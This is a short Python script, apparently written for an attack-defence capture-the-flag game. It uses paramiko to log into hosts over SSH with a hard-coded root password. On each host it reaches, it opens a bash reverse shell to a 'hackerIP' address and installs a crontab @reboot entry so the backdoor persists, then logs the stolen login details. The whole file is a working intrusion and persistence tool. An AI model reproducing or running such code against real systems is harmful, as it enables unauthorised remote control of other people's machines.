# pip installs cryptography==2.4.2
# pip install paramiko

import paramiko
import winsound


username = 'root'
password = 'sss42461117'
port = 7650
hackerIP = '192.168.0.2'
maxCommandID = 44

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.load_system_host_keys()
for i in range(1, maxCommandID + 1):
    victimIP = '192.168.0.150'.format(i)
    if i != 20:
        #username = 'team{}'.format(i)
        try:
            client.connect(hostname=victimIP, username=username, password=password, port=22, timeout=10)
            stdin, stdout, stderr = client.exec_command('pwd')
            if stdout.readlines():
                backdoor = 'bash -i >& /dev/tcp/{}/{} 0>&14'.format(hackerIP, port + i)
                client.exec_command('{}'.format(backdoor))
                client.exec_command('( crontab -l | grep -v -F "{0}" ; echo "@reboot {0}" ) | crontab -'.format(backdoor))
                message = 'IP: {}\nLogin: {}\nPassword: {}\nTCP Port: {}\n\n'.format(victimIP, username,
                                                                                    password, port + i)
                print(message)
                with open('SSHChecker.log', 'w+') as file:
                    file.write(message)
                winsound.Beep(500, 990)
            client.close()
        except paramiko.ssh_exception.NoValidConnectionsError:
            pass
